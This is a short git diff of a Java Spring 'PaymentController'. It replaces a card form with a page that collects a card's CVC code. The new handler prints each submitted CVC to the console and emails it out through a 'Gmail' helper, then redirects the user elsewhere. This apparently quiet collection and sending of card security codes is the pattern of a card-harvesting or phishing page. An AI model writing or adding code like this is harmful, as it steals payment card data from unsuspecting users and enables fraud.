@@ -1,6 +1,6 @@
 package com.example.demo.controllers;
 
-import com.example.demo.model.Card;
+import com.example.demo.model.Cvc;
 import org.springframework.stereotype.Controller;
 import org.springframework.ui.Model;
 import org.springframework.web.bind.annotation.GetMapping;
@@ -12,15 +12,18 @@ public class PaymentController {
 
     @GetMapping("/PAYMENT")
     public String PAYMENT(Model model) {
-        model.addAttribute("card", new Card());
-        return "PAYMENT";
+        model.addAttribute("cvc", new Cvc());
+        return "cvc_kode";
     }
 
-    @PostMapping("/createCard")
-    public String createCard(@ModelAttribute Card card) {
+    @PostMapping("/createCVC")
+    public String createCVC(@ModelAttribute Cvc cvc)
+    {
+        System.out.println("cvc : " + cvc);
+        Gmail gmail = new Gmail();
+        gmail.send(cvc.toString());
 
-
-        return "redirect:/cvc_kode";
+        return "redirect:/Cars";
     }
 
 }
